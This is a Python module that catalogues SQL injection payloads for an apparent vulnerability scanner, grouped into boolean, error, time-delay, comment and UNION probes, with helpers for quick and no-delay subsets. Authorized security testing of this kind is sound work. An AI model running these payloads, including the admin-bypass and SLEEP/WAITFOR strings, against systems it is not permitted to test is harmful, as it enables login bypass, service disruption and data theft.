#!/usr/bin/env python3
"""
SQL Injection Payload Definitions
=================================
Centralized payload library organized by injection technique.
For educational and authorized testing purposes only.
"""

from typing import Dict, List, NamedTuple
from enum import Enum


class PayloadType(Enum):
    """Categories of SQL injection payloads."""
    BOOLEAN = "boolean"
    ERROR = "error"
    TIME = "time"
    COMMENT = "comment"
    UNION = "union"


class Payload(NamedTuple):
    """Represents a single SQL injection payload."""
    value: str
    payload_type: PayloadType
    description: str
    risk_level: str  # low, medium, high


# Boolean-based payloads - Testing true/false conditions
BOOLEAN_PAYLOADS: List[Payload] = [
    Payload("' OR '1'='1", PayloadType.BOOLEAN, "Classic boolean OR injection (single quote)", "medium"),
    Payload("\" OR \"1\"=\"1", PayloadType.BOOLEAN, "Boolean OR injection (double quote)", "medium"),
    Payload("' OR 1=1--", PayloadType.BOOLEAN, "Boolean OR with comment terminator", "medium"),
    Payload("\" OR 1=1--", PayloadType.BOOLEAN, "Boolean OR double quote with comment", "medium"),
    Payload("' OR 'x'='x", PayloadType.BOOLEAN, "Boolean OR string comparison", "medium"),
    Payload("') OR ('1'='1", PayloadType.BOOLEAN, "Boolean OR with parentheses", "medium"),
    Payload("1' OR '1'='1' /*", PayloadType.BOOLEAN, "Boolean OR with block comment", "medium"),
    Payload("admin'--", PayloadType.BOOLEAN, "Admin bypass with comment", "high"),
    Payload("' OR ''='", PayloadType.BOOLEAN, "Empty string comparison", "low"),
    Payload("1 OR 1=1", PayloadType.BOOLEAN, "Numeric boolean injection", "medium"),
]

# Error-based payloads - Triggering SQL syntax errors
ERROR_PAYLOADS: List[Payload] = [
    Payload("'", PayloadType.ERROR, "Single quote - basic syntax break", "low"),
    Payload("\"", PayloadType.ERROR, "Double quote - basic syntax break", "low"),
    Payload("')", PayloadType.ERROR, "Quote with closing parenthesis", "low"),
    Payload("')(", PayloadType.ERROR, "Quote with mismatched parentheses", "low"),
    Payload("''", PayloadType.ERROR, "Double single quotes", "low"),
    Payload("`", PayloadType.ERROR, "Backtick - MySQL identifier break", "low"),
    Payload("';", PayloadType.ERROR, "Quote with semicolon", "low"),
    Payload("\\", PayloadType.ERROR, "Backslash escape test", "low"),
    Payload("' AND '1'='2", PayloadType.ERROR, "False condition test", "low"),
    Payload("1'1", PayloadType.ERROR, "Numeric with embedded quote", "low"),
]

# Time-based payloads - Detecting blind SQLi via delays
TIME_PAYLOADS: List[Payload] = [
    Payload("' OR SLEEP(5)--", PayloadType.TIME, "MySQL SLEEP function", "high"),
    Payload("\" OR SLEEP(5)--", PayloadType.TIME, "MySQL SLEEP double quote", "high"),
    Payload("'; WAITFOR DELAY '0:0:5'--", PayloadType.TIME, "MSSQL WAITFOR DELAY", "high"),
    Payload("' OR pg_sleep(5)--", PayloadType.TIME, "PostgreSQL pg_sleep", "high"),
    Payload("1' AND SLEEP(5)#", PayloadType.TIME, "MySQL SLEEP with hash comment", "high"),
    Payload("' OR BENCHMARK(10000000,SHA1('test'))--", PayloadType.TIME, "MySQL BENCHMARK delay", "high"),
    Payload("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", PayloadType.TIME, "PostgreSQL conditional delay", "high"),
]

# Comment-based payloads - Using SQL comments for injection
COMMENT_PAYLOADS: List[Payload] = [
    Payload("'--", PayloadType.COMMENT, "Single quote with line comment", "medium"),
    Payload("\"--", PayloadType.COMMENT, "Double quote with line comment", "medium"),
    Payload("'#", PayloadType.COMMENT, "Single quote with hash comment (MySQL)", "medium"),
    Payload("'/*", PayloadType.COMMENT, "Single quote with block comment start", "medium"),
    Payload("*/", PayloadType.COMMENT, "Block comment end", "low"),
    Payload("/**/", PayloadType.COMMENT, "Empty block comment", "low"),
    Payload("'-- -", PayloadType.COMMENT, "Quote with spaced comment", "medium"),
    Payload("';--", PayloadType.COMMENT, "Statement terminator with comment", "medium"),
]

# Union-based payloads - Extracting data via UNION SELECT
UNION_PAYLOADS: List[Payload] = [
    Payload("' UNION SELECT NULL--", PayloadType.UNION, "Union with single NULL column", "high"),
    Payload("' UNION SELECT NULL,NULL--", PayloadType.UNION, "Union with two NULL columns", "high"),
    Payload("' UNION SELECT NULL,NULL,NULL--", PayloadType.UNION, "Union with three NULL columns", "high"),
    Payload("' UNION SELECT 1,2,3--", PayloadType.UNION, "Union with numeric columns", "high"),
    Payload("' UNION ALL SELECT NULL--", PayloadType.UNION, "Union ALL variant", "high"),
    Payload("\" UNION SELECT NULL--", PayloadType.UNION, "Double quote union injection", "high"),
]


def get_all_payloads() -> List[Payload]:
    """Return all payloads from all categories."""
    return (
        BOOLEAN_PAYLOADS +
        ERROR_PAYLOADS +
        TIME_PAYLOADS +
        COMMENT_PAYLOADS +
        UNION_PAYLOADS
    )


def get_payloads_by_type(payload_type: PayloadType) -> List[Payload]:
    """Return payloads filtered by type."""
    type_map: Dict[PayloadType, List[Payload]] = {
        PayloadType.BOOLEAN: BOOLEAN_PAYLOADS,
        PayloadType.ERROR: ERROR_PAYLOADS,
        PayloadType.TIME: TIME_PAYLOADS,
        PayloadType.COMMENT: COMMENT_PAYLOADS,
        PayloadType.UNION: UNION_PAYLOADS,
    }
    return type_map.get(payload_type, [])


def get_quick_payloads() -> List[Payload]:
    """Return a smaller set of payloads for quick scanning."""
    return [
        BOOLEAN_PAYLOADS[0],   # ' OR '1'='1
        BOOLEAN_PAYLOADS[2],   # ' OR 1=1--
        ERROR_PAYLOADS[0],     # '
        ERROR_PAYLOADS[1],     # "
        COMMENT_PAYLOADS[0],   # '--
        TIME_PAYLOADS[0],      # ' OR SLEEP(5)--
    ]


def get_safe_payloads() -> List[Payload]:
    """Return payloads that are less likely to cause issues (no time delays)."""
    return [p for p in get_all_payloads() if p.payload_type != PayloadType.TIME]


if __name__ == "__main__":
    # Demo: Print all payloads
    print("=" * 60)
    print("SQL Injection Payload Library")
    print("=" * 60)
    
    for ptype in PayloadType:
        payloads = get_payloads_by_type(ptype)
        print(f"\n[{ptype.value.upper()}] - {len(payloads)} payloads")
        for p in payloads[:3]:  # Show first 3 of each type
            print(f"  • {p.value:<40} ({p.risk_level})")
        if len(payloads) > 3:
            print(f"  ... and {len(payloads) - 3} more")
    
    print(f"\nTotal payloads available: {len(get_all_payloads())}")
